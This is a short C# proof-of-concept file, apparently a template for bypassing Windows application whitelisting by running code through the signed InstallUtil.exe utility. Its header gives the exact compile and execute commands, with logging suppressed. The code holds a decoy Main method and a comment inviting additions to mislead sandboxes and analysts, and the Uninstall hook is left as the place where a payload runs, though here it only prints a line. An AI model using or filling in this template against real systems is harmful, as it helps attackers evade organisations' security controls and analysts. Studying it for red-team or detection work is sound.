using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
  
/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /out:exec.exe Win10Bypass.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exec.exe
     
*/
 
    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("Hello From Main...I Don't Do Anything");
            //Add any behaviour here to throw off sandbox execution/analysts :)
             
        }
         
    }
     
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
         
            Console.WriteLine("I am banned");
             
        }
         
    }